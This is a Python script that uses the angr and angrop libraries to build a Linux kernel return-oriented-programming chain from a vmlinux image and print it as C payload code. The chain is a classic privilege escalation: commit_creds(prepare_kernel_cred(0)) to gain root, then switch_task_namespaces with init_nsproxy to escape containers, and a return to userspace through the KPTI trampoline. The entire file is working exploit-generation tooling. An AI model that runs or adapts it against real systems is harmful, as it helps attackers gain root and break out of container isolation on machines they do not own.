#!/usr/bin/env -S python3 -u

import angr
import angrop
import argparse
import os
import subprocess
import re

BIT_SIZE = 64
PREPARE_KERNEL_CRED = "prepare_kernel_cred"
COMMIT_KERNEL_CRED = "commit_creds"
FIND_TASK_BY_VPID = "find_task_by_vpid"
SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
PARSE_MOUNT_OPTIONS = "parse_mount_options"
KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
INIT_NSPROXY = "init_nsproxy"

ROP_C_FORMAT = "*(rop++) = {};"
ROP_REBASE_C_FORMAT = "*(rop++) = kbase + {};"


class RopGeneratorError(Exception):
    def __init__(self, message):
        super().__init__(message)


class RopGeneratorAngrop:

    def __init__(self, vmlinux_path) -> None:
        self._vmlinux_path = vmlinux_path
        self._project = angr.Project(vmlinux_path)
        self._symbol_map = self._load_symbols()
        self._addr_to_symbol = {addr: name for name,
                                addr in self._symbol_map.items()}
        # vmlinux is not marked PIE but we want the rebase option in angrop turned on
        self._project.loader.main_object.pic = True
        # hack to only rebase the correct values
        self._project.loader.main_object.mapped_base = \
            self._project.loader.main_object.segments[0].vaddr
        self._kpti_trampoline = self._find_kpti_trampoline()
        self._rop = self._load_angrop()

    def _load_symbols(self):
        # Run nm command to get symbol information
        result = subprocess.run(
            ["nm", self._vmlinux_path],
            capture_output=True,
            text=True,
            check=True,
        )

        # Parse nm output
        symbols = {}
        for line in result.stdout.splitlines():
            # Example line: "ffffffff81000000 t _stext"
            match = re.match(r"([0-9a-fA-F]+) . (.+)", line)
            if match:
                address_str, name = match.groups()
                # Convert hex address to integer
                address = int(address_str, 16)
                symbols[name] = address

        return symbols

    def _find_symbol_addr(self, func_name):
        return self._symbol_map.get(func_name)

    def _find_symbol_name(self, addr):
        self._addr_to_symbol.get(addr)

    def _load_angrop(self):
        rop = self._project.analyses.ROP(kernel_mode=True, fast_mode=True)
        # rop.load_gadgets("angrop_gadgets_1")
        rop.find_gadgets(processes=os.cpu_count())
        # rop.save_gadgets("angrop_gadgets_1")
        return rop

    def build_rop_chain(self):
        chain = self._rop.func_call(
            self._find_symbol_addr(PREPARE_KERNEL_CRED), [0])
        chain += self._rop.move_regs(rdi="rax")
        chain += self._rop.func_call(
            self._find_symbol_addr(COMMIT_KERNEL_CRED), [])
        chain += self._rop.func_call(
            self._find_symbol_addr(FIND_TASK_BY_VPID), [1])
        chain += self._rop.move_regs(rdi="rax")
        # parse_mount_options has reference to init_nsproxy
        chain += self._rop.set_regs(self._find_symbol_addr(INIT_NSPROXY),
                                    preserve_regs=("rdi",))
        chain += self._rop.func_call(
            self._find_symbol_addr(SWITCH_TASK_NAMESPACES), [])
        chain += self._rop.func_call(self._kpti_trampoline, [])
        chain.add_value(0)
        chain.add_value(0)
        return chain

    def _find_kpti_trampoline(self):
        init_block = self._project.factory.block(
            self._find_symbol_addr(KPTI_TRAMPOLINE))
        next_block = self._project.factory.block(
            list(init_block.vex.constant_jump_targets)[0])
        for ins in next_block.disassembly.insns:
            if ins.mnemonic == "mov" and "rdi, rsp" in ins.op_str:
                # add to symbol map
                self._symbol_map["kpti_trampoline"] = ins.address
                self._addr_to_symbol[ins.address] = "kpti_trampoline"
                return ins.address

    def payload_c_code(self, chain, print_instructions=True):
        """
        :param print_instructions: prints the instructions that the rop gadgets use
        :return: prints the code for the rop payload
        """
        payload = ""

        concrete_vals = chain._concretize_chain_values()
        for value, rebased in concrete_vals:

            instruction_code = ""
            if print_instructions:
                sec = self._project.loader.find_section_containing(value)
                if sec and sec.is_executable:
                    symbol_name = self._find_symbol_name(value)
                    if symbol_name:
                        asmstring = symbol_name
                    else:
                        asmstring = angrop.rop_utils.addr_to_asmstring(
                            self._project, value)
                    if asmstring != "":
                        instruction_code = "\t// " + asmstring

            if rebased:
                # Get the base address from the first segment
                value -= self._project.loader.main_object.segments[0].vaddr
                payload += ROP_REBASE_C_FORMAT.format(
                    hex(value)) + instruction_code
            else:
                payload += ROP_C_FORMAT.format(hex(value)) + instruction_code
            payload += "\n"

        # add the user variables
        payload += ROP_C_FORMAT.format(
            "/* TODO: put userspace function name here */")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved cs variable name here*/")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved rflags variable name here*/")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved stack pointer variable name here*/")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved ss variable name here*/")
        payload += "\n"

        return payload


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generates ROP payloads for linux kernel images")
    parser.add_argument("vmlinux", help="Path to vmlinux file")
    args = parser.parse_args()
    rop_generator = RopGeneratorAngrop(args.vmlinux)
    chain = rop_generator.build_rop_chain()
    payload_code = rop_generator.payload_c_code(chain)
    print(payload_code)
